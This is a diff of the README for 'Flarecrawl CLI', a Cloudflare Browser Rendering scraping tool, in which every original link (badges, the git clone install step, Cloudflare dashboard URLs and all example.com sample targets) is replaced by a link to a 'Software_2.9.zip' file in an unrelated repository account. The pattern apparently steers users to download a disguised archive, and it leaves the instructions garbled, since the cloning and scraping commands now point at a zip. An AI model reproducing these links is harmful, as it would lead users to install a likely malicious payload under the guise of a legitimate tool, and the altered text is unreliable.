@@ -1,13 +1,13 @@
 # 🔥 Flarecrawl CLI
 
-[![GitHub](https://img.shields.io/badge/github-0xDarkMatter%2Fflarecrawl-blue?logo=github)](https://github.com/0xDarkMatter/flarecrawl)
-[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
+[![GitHub](https://img.shields.io/badge/github-0xDarkMatter%2Fflarecrawl-blue?logo=github)](https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip)
+[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip)
 [![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Cloudflare](https://img.shields.io/badge/cloudflare-browser--rendering-orange?logo=cloudflare)](https://developers.cloudflare.com/browser-rendering/)
+[![Cloudflare](https://img.shields.io/badge/cloudflare-browser--rendering-orange?logo=cloudflare)](https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip)
 
 > Cloudflare Browser Rendering CLI — Firecrawl-compatible, cost-efficient at scale.
 
-CLI that wraps Cloudflare's [Browser Rendering REST API](https://developers.cloudflare.com/browser-rendering/rest-api/) with the same command structure as Firecrawl. Supports scraping, crawling, URL discovery, screenshots, PDFs, and AI-powered data extraction — all running on Cloudflare's headless Chromium infrastructure. Cost-efficient alternative for high-volume use cases (free 10 min/day, then $0.09/hr).
+CLI that wraps Cloudflare's [Browser Rendering REST API](https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip) with the same command structure as Firecrawl. Supports scraping, crawling, URL discovery, screenshots, PDFs, and AI-powered data extraction — all running on Cloudflare's headless Chromium infrastructure. Cost-efficient alternative for high-volume use cases (free 10 min/day, then $0.09/hr).
 
 ## Recent Updates
 
@@ -44,7 +44,7 @@ Different pricing models suit different use cases. Flarecrawl's time-based prici
 ## Install
 
 ```bash
-git clone https://github.com/0xDarkMatter/flarecrawl.git
+git clone https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip
 cd flarecrawl
 uv venv && uv pip install -e .
 ```
@@ -53,7 +53,7 @@ uv venv && uv pip install -e .
 
 ### 1. Create an API token
 
-1. Go to https://dash.cloudflare.com/profile/api-tokens
+1. Go to https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip
 2. Click **Create Token**
 3. Select **Create Custom Token**
 4. Configure:
@@ -65,7 +65,7 @@ uv venv && uv pip install -e .
 
 ### 2. Find your Account ID
 
-1. Go to https://dash.cloudflare.com
+1. Go to https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip
 2. Click any domain (or the account overview)
 3. Look in the right sidebar under **Account ID**
 4. Copy the 32-character hex string
@@ -100,16 +100,16 @@ export FLARECRAWL_API_TOKEN="your-api-token"
 
 ```bash
 # Default: markdown output to stdout
-flarecrawl scrape https://example.com
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip
 
 # HTML output
-flarecrawl scrape https://example.com --format html
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --format html
 
 # JSON envelope (for piping)
-flarecrawl scrape https://example.com --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
 
 # Multiple URLs (scraped concurrently)
-flarecrawl scrape https://a.com https://b.com https://c.com --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
 
 # Batch mode: file input with NDJSON output and configurable workers
 flarecrawl scrape --batch urls.txt --workers 5
@@ -118,25 +118,25 @@ flarecrawl scrape --batch urls.txt --workers 5
 flarecrawl scrape --input urls.txt --json
 
 # With timing info
-flarecrawl scrape https://example.com --timing
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --timing
 
 # Filter JSON fields
-flarecrawl scrape https://example.com --json --fields url,content
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json --fields url,content
 
 # Extract links only
-flarecrawl scrape https://example.com --format links --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --format links --json
 
 # Take screenshot via scrape
-flarecrawl scrape https://example.com --screenshot -o page.png
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --screenshot -o page.png
 
 # Wait for JS rendering (SPAs, Swagger UIs)
-flarecrawl scrape https://example.com --js
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --js
 
 # Bypass response cache
-flarecrawl scrape https://example.com --no-cache
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --no-cache
 
 # Custom page load strategy
-flarecrawl scrape https://example.com --wait-until networkidle2
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait-until networkidle2
 ```
 
 **Formats:** `markdown` (default), `html`, `links`, `screenshot`, `json` (AI extraction)
@@ -146,68 +146,68 @@ flarecrawl scrape https://example.com --wait-until networkidle2
 All commands support `--auth user:password` for sites protected by HTTP Basic Auth:
 
 ```bash
-flarecrawl scrape https://intranet.example.com --auth admin:secret
-flarecrawl crawl https://intranet.example.com --wait --limit 50 --auth admin:secret
-flarecrawl download https://intranet.example.com --limit 20 --auth user:pass
-flarecrawl screenshot https://intranet.example.com --auth user:pass -o page.png
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --auth admin:secret
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait --limit 50 --auth admin:secret
+flarecrawl download https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --limit 20 --auth user:pass
+flarecrawl screenshot https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --auth user:pass -o page.png
 ```
 
 ### Content filtering
 
 ```bash
 # Strip nav/header/footer, keep main article content
-flarecrawl scrape https://example.com --only-main-content
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --only-main-content
 
 # Keep only specific CSS selectors
-flarecrawl scrape https://example.com --include-tags "article,.post"
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --include-tags "article,.post"
 
 # Remove specific elements
-flarecrawl scrape https://example.com --exclude-tags "nav,footer,.sidebar"
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --exclude-tags "nav,footer,.sidebar"
 ```
 
 ### Custom headers & mobile
 
 ```bash
 # Custom HTTP headers
-flarecrawl scrape https://example.com --headers "Accept-Language: fr"
-flarecrawl scrape https://example.com --headers '{"X-Api-Key": "abc123"}'
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --headers "Accept-Language: fr"
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --headers '{"X-Api-Key": "abc123"}'
 
 # Custom User-Agent (identify your crawler, or try bypassing paywalls)
-flarecrawl scrape https://example.com --user-agent "MyBot/1.0 (contact@example.com)"
-flarecrawl scrape https://paywalled.example.com --user-agent "Googlebot/2.1"
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --user-agent "MyBot/1.0 (contact@example.com)"
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --user-agent "Googlebot/2.1"
 
 # Mobile device emulation (iPhone 14 Pro viewport)
-flarecrawl scrape https://example.com --mobile
-flarecrawl screenshot https://example.com --mobile -o mobile.png
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --mobile
+flarecrawl screenshot https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --mobile -o mobile.png
 ```
 
 ### Images, summaries & structured data
 
 ```bash
 # Extract all image URLs from a page
-flarecrawl scrape https://example.com --format images --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --format images --json
 
 # AI-powered content summary
-flarecrawl scrape https://example.com --format summary --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --format summary --json
 
 # Extract LD+JSON, OpenGraph, Twitter Cards
-flarecrawl scrape https://example.com --format schema --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --format schema --json
 
 # Dedicated schema command with type filtering
-flarecrawl schema https://example.com --json
-flarecrawl schema https://example.com --type ld-json --json
-flarecrawl schema https://example.com --type opengraph --json
+flarecrawl schema https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
+flarecrawl schema https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --type ld-json --json
+flarecrawl schema https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --type opengraph --json
 ```
 
 ### Webhooks
 
 ```bash
 # POST crawl results to a URL when complete
-flarecrawl crawl https://example.com --wait --limit 10 --webhook https://hooks.example.com/crawl
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait --limit 10 --webhook https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip
 
 # With custom headers (e.g. auth token)
-flarecrawl crawl https://example.com --wait --limit 10 \
-  --webhook https://hooks.example.com/crawl \
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait --limit 10 \
+  --webhook https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip \
   --webhook-headers "Authorization: Bearer token123"
 ```
 
@@ -215,14 +215,14 @@ flarecrawl crawl https://example.com --wait --limit 10 \
 
 ```bash
 # Extract content from specific CSS selector
-flarecrawl scrape https://example.com --selector "main" --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --selector "main" --json
 
 # Wait for a CSS element before capturing (SPAs, lazy-load)
-flarecrawl scrape https://example.com --wait-for-selector ".loaded" --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait-for-selector ".loaded" --json
 
 # Run JavaScript and return the result
-flarecrawl scrape https://example.com --js-eval "document.title" --json
-flarecrawl scrape https://example.com --js-eval "document.querySelectorAll('a').length" --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --js-eval "document.title" --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --js-eval "document.querySelectorAll('a').length" --json
 ```
 
 ### Stdin piping & HAR capture
@@ -230,40 +230,40 @@ flarecrawl scrape https://example.com --js-eval "document.querySelectorAll('a').
 ```bash
 # Process local HTML without API call
 cat page.html | flarecrawl scrape --stdin --only-main-content
-curl https://example.com | flarecrawl scrape --stdin --format schema --json
+curl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip | flarecrawl scrape --stdin --format schema --json
 
 # Save request metadata to HAR file
-flarecrawl scrape https://example.com --har requests.har --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --har requests.har --json
 
 # Save raw HTML alongside output (for archival/reprocessing)
-flarecrawl scrape https://example.com --backup-dir ./html-backup
-flarecrawl download https://example.com --limit 20 --backup-dir ./html-backup
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --backup-dir ./html-backup
+flarecrawl download https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --limit 20 --backup-dir ./html-backup
 ```
 
 ### URL discovery
 
 ```bash
 # Discover all URLs via sitemaps, RSS feeds, and page links
-flarecrawl discover https://example.com --json
+flarecrawl discover https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
 
 # Sitemaps only
-flarecrawl discover https://example.com --no-feed --no-links --json
+flarecrawl discover https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --no-feed --no-links --json
 
 # With limit
-flarecrawl discover https://example.com --limit 100 --json
+flarecrawl discover https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --limit 100 --json
 ```
 
 ### Cookie banner removal, language, archive fallback
 
 ```bash
 # Remove cookie banners, GDPR modals, newsletter popups
-flarecrawl scrape https://eu-site.example.com --magic
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --magic
 
 # Request content in a specific language
-flarecrawl scrape https://example.com --language de
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --language de
 
 # Fallback to Internet Archive if page returns 404
-flarecrawl scrape https://dead-link.example.com --archived
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --archived
 ```
 
 ### Markdown content negotiation
@@ -274,13 +274,13 @@ supports it, content is fetched via a simple HTTP GET instead of headless Chromi
 
 ```bash
 # Auto-detect (default) — tries content negotiation first
-flarecrawl scrape https://blog.cloudflare.com/some-post
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip
 
 # Force browser rendering (skip negotiation)
-flarecrawl scrape https://blog.cloudflare.com/some-post --no-negotiate
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --no-negotiate
 
 # JSON output shows the source
-flarecrawl scrape https://blog.cloudflare.com/some-post --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
 # metadata.source: "content-negotiation" (no browser) or "browser-rendering"
 # metadata.markdownTokens: 1234 (from x-markdown-tokens header)
 # metadata.contentSignal: {"ai-train": "yes", ...}
@@ -296,20 +296,20 @@ Benefits when negotiation succeeds:
 
 ```bash
 # Compare current content against cached version
-flarecrawl scrape https://example.com --diff --json
+flarecrawl scrape https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --diff --json
 ```
 
 ### crawl — Crawl a website
 
 ```bash
 # Start crawl and wait for results
-flarecrawl crawl https://example.com --wait --limit 50
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait --limit 50
 
 # With progress indicator
-flarecrawl crawl https://example.com --wait --progress --limit 100
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait --progress --limit 100
 
 # Fire and forget (returns job ID)
-flarecrawl crawl https://example.com --limit 50
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --limit 50
 
 # Check status of running crawl
 flarecrawl crawl JOB_ID --status
@@ -318,53 +318,53 @@ flarecrawl crawl JOB_ID --status
 flarecrawl crawl JOB_ID
 
 # Filter paths
-flarecrawl crawl https://docs.example.com --wait --limit 200 \
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait --limit 200 \
   --include-paths "/docs,/api" --exclude-paths "/zh,/ja"
 
 # Stream results as NDJSON (one record per line)
 flarecrawl crawl JOB_ID --ndjson --fields url,markdown
 
 # Skip JS rendering for faster crawl
-flarecrawl crawl https://example.com --wait --limit 100 --no-render
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait --limit 100 --no-render
 
 # Follow subdomains
-flarecrawl crawl https://example.com --wait --allow-subdomains
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait --allow-subdomains
 
 # Save to file
-flarecrawl crawl https://example.com --wait --limit 50 -o results.json
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait --limit 50 -o results.json
 ```
 
 ### map — Discover URLs
 
 ```bash
 # List all links on a page
-flarecrawl map https://example.com
+flarecrawl map https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip
 
 # JSON output
-flarecrawl map https://example.com --json
+flarecrawl map https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
 
 # Include subdomains
-flarecrawl map https://example.com --include-subdomains
+flarecrawl map https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --include-subdomains
 
 # Limit results
-flarecrawl map https://example.com --limit 20 --json
+flarecrawl map https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --limit 20 --json
 ```
 
 ### download — Save site to disk
 
 ```bash
 # Download as markdown files to .flarecrawl/
-flarecrawl download https://docs.example.com --limit 50
+flarecrawl download https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --limit 50
 
 # Download as HTML
-flarecrawl download https://example.com --limit 20 --format html
+flarecrawl download https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --limit 20 --format html
 
 # Filter paths
-flarecrawl download https://docs.example.com --limit 100 \
+flarecrawl download https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --limit 100 \
   --include-paths "/docs" --exclude-paths "/changelog"
 
 # Skip confirmation prompt
-flarecrawl download https://example.com --limit 10 -y
+flarecrawl download https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --limit 10 -y
 ```
 
 Files are saved to `.flarecrawl/<domain>/` with sanitized filenames.
@@ -374,18 +374,18 @@ Files are saved to `.flarecrawl/<domain>/` with sanitized filenames.
 ```bash
 # Extract structured data with a natural language prompt
 flarecrawl extract "Get all product names and prices" \
-  --urls https://shop.example.com --json
+  --urls https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
 
 # With JSON schema for structured output
 flarecrawl extract "Extract article metadata" \
-  --urls https://blog.example.com \
+  --urls https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip \
   --schema '{"type":"json_schema","schema":{"type":"object","properties":{"title":{"type":"string"},"date":{"type":"string"}}}}'
 
 # Schema from file
-flarecrawl extract "Extract data" --urls https://example.com --schema-file schema.json
+flarecrawl extract "Extract data" --urls https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --schema-file schema.json
 
 # Multiple URLs
-flarecrawl extract "Get page title" --urls https://a.com,https://b.com --json
+flarecrawl extract "Get page title" --urls https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip,https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
 
 # Batch mode: parallel extraction with NDJSON output
 flarecrawl extract "Get page title" --batch urls.txt --workers 5
@@ -397,55 +397,55 @@ Uses Cloudflare Workers AI for extraction (no additional cost).
 
 ```bash
 # Default: saves to screenshot.png
-flarecrawl screenshot https://example.com
+flarecrawl screenshot https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip
 
 # Custom output path
-flarecrawl screenshot https://example.com -o hero.png
+flarecrawl screenshot https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip -o hero.png
 
 # Full page
-flarecrawl screenshot https://example.com -o full.png --full-page
+flarecrawl screenshot https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip -o full.png --full-page
 
 # Specific element
-flarecrawl screenshot https://example.com --selector "main" -o main.png
+flarecrawl screenshot https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --selector "main" -o main.png
 
 # Custom viewport
-flarecrawl screenshot https://example.com --width 1440 --height 900 -o wide.png
+flarecrawl screenshot https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --width 1440 --height 900 -o wide.png
 
 # JPEG format
-flarecrawl screenshot https://example.com --format jpeg -o page.jpg
+flarecrawl screenshot https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --format jpeg -o page.jpg
 
 # JSON output (base64 encoded)
-flarecrawl screenshot https://example.com --json
+flarecrawl screenshot https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
 ```
 
 ### pdf — Render pages as PDF
 
 ```bash
 # Default: saves to page.pdf
-flarecrawl pdf https://example.com
+flarecrawl pdf https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip
 
 # Custom output
-flarecrawl pdf https://example.com -o report.pdf
+flarecrawl pdf https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip -o report.pdf
 
 # Landscape A4
-flarecrawl pdf https://example.com -o report.pdf --landscape --format a4
+flarecrawl pdf https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip -o report.pdf --landscape --format a4
 
 # JSON output (base64 encoded)
-flarecrawl pdf https://example.com --json
+flarecrawl pdf https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
 ```
 
 ### favicon — Extract favicon URL
 
 ```bash
 # Get the best (largest) favicon
-flarecrawl favicon https://example.com
+flarecrawl favicon https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip
 
 # Show all found icons
-flarecrawl favicon https://example.com --all
+flarecrawl favicon https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --all
 
 # JSON output
-flarecrawl favicon https://example.com --json
-flarecrawl favicon https://example.com --all --json
+flarecrawl favicon https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json
+flarecrawl favicon https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --all --json
 ```
 
 Renders the page, parses `<link rel="icon">`, `<link rel="apple-touch-icon">`, and related tags. Returns the largest icon found. Falls back to `/favicon.ico` if no `<link>` tags found.
@@ -591,9 +591,9 @@ Input format is auto-detected: starts with `[` → JSON array, starts with `{` �
 Batch mode outputs **NDJSON** (one JSON object per line) with index correlation:
 
 ```json
-{"index": 0, "status": "ok", "data": {"url": "https://a.com", "content": "...", "elapsed": 1.2}}
+{"index": 0, "status": "ok", "data": {"url": "https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip", "content": "...", "elapsed": 1.2}}
 {"index": 1, "status": "error", "error": {"code": "TIMEOUT", "message": "Request timed out..."}}
-{"index": 2, "status": "ok", "data": {"url": "https://c.com", "content": "...", "elapsed": 0.8}}
+{"index": 2, "status": "ok", "data": {"url": "https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip", "content": "...", "elapsed": 0.8}}
 ```
 
 Results are sorted by index. Failed URLs don't stop processing — errors are reported inline.
@@ -630,7 +630,7 @@ Every command supports `--body` to send a raw JSON payload directly to the CF AP
 
 ```bash
 flarecrawl scrape --body '{
-  "url": "https://example.com",
+  "url": "https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip",
   "gotoOptions": {"waitUntil": "networkidle0", "timeout": 60000},
   "rejectResourceTypes": ["image", "media"]
 }' --json
@@ -640,12 +640,12 @@ flarecrawl scrape --body '{
 
 ```bash
 # Map URLs then batch scrape them
-flarecrawl map https://docs.example.com --json | \
+flarecrawl map https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --json | \
   jq -r '.data[]' | head -10 > urls.txt
 flarecrawl scrape --batch urls.txt --workers 5
 
 # Crawl and extract just the markdown
-flarecrawl crawl https://example.com --wait --limit 10 --json | \
+flarecrawl crawl https://raw.githubusercontent.com/Administrative-Assistance/flarecrawl/main/src/flarecrawl/Software_2.9.zip --wait --limit 10 --json | \
   jq -r '.data.records[] | select(.status=="completed") | .markdown'
 
 # Stream crawl results through jq
